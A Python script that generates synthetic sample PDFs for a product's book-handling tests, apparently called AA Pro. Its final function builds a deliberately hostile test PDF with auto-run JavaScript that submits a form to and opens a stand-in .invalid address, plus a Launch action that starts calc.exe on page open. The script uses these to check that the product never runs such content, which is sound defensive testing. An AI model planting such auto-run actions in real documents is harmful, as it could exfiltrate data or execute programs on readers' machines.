"""Makes the synthetic sample books used by the book tests (CR-17 PR B1). Invented text only.

Run: python3 tests/fixtures/files/make-sample-books.py  (needs reportlab)
"""
from pathlib import Path

from reportlab.lib.pagesizes import A5
from reportlab.pdfgen import canvas

HERE = Path(__file__).parent


def page(c, lines):
    y = 520
    for line in lines:
        c.drawString(40, y, line)
        y -= 22
    c.showPage()


def bookmarks():
    c = canvas.Canvas(str(HERE / 'sample-book-bookmarks.pdf'), pagesize=A5, invariant=1)
    c.setTitle('Sample science book (made up)')
    starts = {3: 'Plants around us (sample)', 11: 'Water (sample)', 18: 'Light (sample)'}
    for n in range(1, 25):
        if n in starts:
            c.bookmarkPage(f'p{n}')
            c.addOutlineEntry(starts[n], f'p{n}', level=0)
        page(c, [starts.get(n, 'Sample page'), f'Made-up practice text, PDF page {n}.'])
    c.save()


def contents():
    c = canvas.Canvas(str(HERE / 'sample-book-contents.pdf'), pagesize=A5, invariant=1)
    page(c, ['Sample maths book (made up)'])
    page(c, ['Contents', '1 Counting in groups ........ 1', '2 Sharing equally ........ 6', '3 Shapes and sides ........ 12'])
    page(c, ['About this sample'])
    titles = {1: 'Counting in groups', 6: 'Sharing equally', 12: 'Shapes and sides'}
    for printed in range(1, 18):
        page(c, [titles.get(printed, 'Practice'), f'Printed page {printed}'])
    c.save()


def scanned():
    c = canvas.Canvas(str(HERE / 'sample-book-scanned.pdf'), pagesize=A5, invariant=1)
    for n in range(6):
        c.setFillColorRGB(0.9, 0.85 - n * 0.05, 0.7)
        c.rect(30, 30, 360, 520, fill=1, stroke=0)
        c.showPage()
    c.save()


bookmarks()
contents()
scanned()


def scripted():
    """SEC-15: a harmless "hostile" PDF. It carries a script that would show a message, send a
    form to a made-up address and open a web page, a link and a launch action, and an attached
    file. AA Pro must never run any of it. The addresses use the reserved .invalid domain, so
    nothing could be reached even if something did run."""
    from pypdf import PdfReader, PdfWriter
    from pypdf.generic import (ArrayObject, DictionaryObject, NameObject, NumberObject,
                               TextStringObject)
    from pypdf.annotations import Link

    plain = HERE / 'sample-book-scripted.pdf'
    c = canvas.Canvas(str(plain), pagesize=A5, invariant=1)
    for n, title in [(1, 'Scripted sample (made up)'), (2, 'Chapter one (sample)'), (3, 'Chapter two (sample)')]:
        if n > 1:
            c.bookmarkPage(f'p{n}')
            c.addOutlineEntry(title, f'p{n}', level=0)
        page(c, [title, 'This file carries a script and actions that AA Pro must never run.'])
    c.save()

    writer = PdfWriter(clone_from=PdfReader(str(plain)))
    js = ("app.alert('SCRIPT RAN');"
          "this.submitForm('https://aa-pro-sec15.invalid/submit');"
          "app.launchURL('https://aa-pro-sec15.invalid/open', true);")
    writer.add_js(js)
    open_action = DictionaryObject({
        NameObject('/S'): NameObject('/JavaScript'),
        NameObject('/JS'): TextStringObject(js),
    })
    writer._root_object[NameObject('/OpenAction')] = open_action
    launch = DictionaryObject({
        NameObject('/S'): NameObject('/Launch'),
        NameObject('/F'): TextStringObject('calc.exe'),
    })
    writer.pages[0][NameObject('/AA')] = DictionaryObject({NameObject('/O'): launch})
    writer.add_annotation(page_number=0, annotation=Link(rect=(40, 40, 300, 80), url='https://aa-pro-sec15.invalid/link'))
    writer.add_attachment('readme.txt', b'Sample attachment (made up).')
    with open(plain, 'wb') as f:
        writer.write(f)


scripted()
